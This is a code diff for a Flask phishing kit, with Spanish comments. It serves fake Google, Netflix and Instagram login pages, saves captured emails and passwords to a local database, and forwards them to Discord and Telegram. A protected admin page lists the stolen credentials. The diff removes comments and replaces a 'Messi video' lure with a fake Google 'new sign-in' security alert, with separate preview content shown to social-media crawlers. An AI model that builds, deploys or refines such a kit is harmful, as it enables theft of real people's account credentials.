@@ -9,7 +9,7 @@ from datetime import datetime
 from flask import Flask, request, render_template_string, redirect, jsonify, abort, session
 
 app = Flask(__name__)
-app.secret_key = 'clave-secreta-para-session-12345'  # Necesaria para la sesión
+app.secret_key = 'clave-secreta-para-session-12345'
 
 # Config
 CONFIG = {
@@ -19,7 +19,7 @@ CONFIG = {
     'redirect_url': 'https://www.google.com',
     'template': 'google',
     'api_key': 'cambia-esta-clave',
-    'admin_password': 'triple777'  # <-- CONTRASEÑA ACTUALIZADA
+    'admin_password': 'triple777'
 }
 
 def load_config():
@@ -65,13 +65,11 @@ def get_geo(ip):
     return "Unknown"
 
 def is_social_crawler(ua):
-    """Detecta si es un crawler de redes sociales que debe ver el contenido público"""
     social_bots = ['facebookexternalhit', 'twitterbot', 'whatsapp', 'linkedinbot', 
                    'telegrambot', 'discord', 'slackbot', 'pinterest', 'redditbot']
     return any(bot in ua.lower() for bot in social_bots)
 
 def send_notifications(data):
-    # Discord
     if CONFIG.get('discord_webhook'):
         try:
             embed = {
@@ -89,7 +87,6 @@ def send_notifications(data):
         except:
             pass
     
-    # Telegram
     if CONFIG.get('telegram_token') and CONFIG.get('telegram_chat'):
         try:
             msg = f"🎯 *Nueva Captura*\n\n📍 `{data['ip']}`\n🌍 `{data['geo']}`\n👤 `{data['username']}`\n🔑 `{data['password'][:30]}`"
@@ -105,8 +102,8 @@ def get_template(name='google'):
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:title" content="😲 Fuertes declaraciones de Messi">
-    <meta property="og:description" content="Ver video exclusivo">
+    <meta property="og:title" content="Alerta de seguridad">
+    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
     <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
     <title>Iniciar sesión</title>
     <style>
@@ -143,6 +140,9 @@ def get_template(name='google'):
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Alerta de seguridad">
+    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
+    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
     <title>Iniciar sesión</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
@@ -173,6 +173,9 @@ def get_template(name='google'):
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Alerta de seguridad">
+    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
+    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
     <title>Netflix</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:'Helvetica Neue',sans-serif}
@@ -201,6 +204,9 @@ def get_template(name='google'):
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Alerta de seguridad">
+    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
+    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
     <title>Instagram</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,sans-serif}
@@ -230,24 +236,23 @@ def get_template(name='google'):
 def handle_bots():
     ua = request.headers.get('User-Agent', '')
     
-    # Si es un crawler social y está en la raíz, mostrar contenido Open Graph
     if is_social_crawler(ua) and request.path == '/':
         return render_template_string('''
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta property="og:title" content="😲 Fuertes declaraciones de Messi">
-    <meta property="og:description" content="Video exclusivo: Messi habla sobre su futuro en el fútbol">
+    <meta property="og:title" content="Alerta de seguridad">
+    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
     <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
-    <meta property="og:url" content="https://video-xeen.onrender.com/">
-    <meta property="og:type" content="video.other">
+    <meta property="og:url" content="https://nuevo-acceso-a-tu-cuenta.onrender.com/">
+    <meta property="og:type" content="website">
     <meta name="twitter:card" content="summary_large_image">
-    <title>Video de Messi</title>
+    <title>Alerta de seguridad</title>
 </head>
 <body>
-    <h1>Video exclusivo de Messi</h1>
-    <p>Contenido disponible solo para usuarios registrados</p>
+    <h1>Alerta de seguridad</h1>
+    <p>Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.</p>
 </body>
 </html>
 '''), 200
@@ -264,7 +269,6 @@ def capture():
     username = request.form.get('email') or request.form.get('username', '')
     password = request.form.get('password', '')
     
-    # Evitar duplicados
     hash_str = hashlib.md5(f"{ip}:{username}:{password}".encode()).hexdigest()
     
     data = {
@@ -278,7 +282,6 @@ def capture():
         'hash': hash_str
     }
     
-    # Guardar
     try:
         conn = sqlite3.connect('credentials.db', check_same_thread=False)
         cursor = conn.cursor()
@@ -295,12 +298,8 @@ def capture():
     send_notifications(data)
     return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))
 
-# =============================================
-# RUTA DE LOGIN PARA VER CREDENCIALES
-# =============================================
 @app.route('/login-credenciales', methods=['GET', 'POST'])
 def login_credenciales():
-    """Página de login para acceder a las credenciales"""
     if request.method == 'POST':
         password = request.form.get('password')
         if password == CONFIG.get('admin_password', 'triple777'):
@@ -328,7 +327,6 @@ def login_credenciales():
             </html>
             ''')
     
-    # Mostrar formulario de login
     return render_template_string('''
     <!DOCTYPE html>
     <html>
@@ -364,8 +362,6 @@ def login_credenciales():
 
 @app.route('/ver-credenciales')
 def ver_credenciales():
-    """Muestra las credenciales - requiere login"""
-    # Verificar si el usuario ha iniciado sesión
     if not session.get('admin_logged'):
         return redirect('/login-credenciales')
     
@@ -434,7 +430,6 @@ def ver_credenciales():
 
 @app.route('/logout-credenciales')
 def logout_credenciales():
-    """Cerrar sesión"""
     session.pop('admin_logged', None)
     return redirect('/login-credenciales')
 
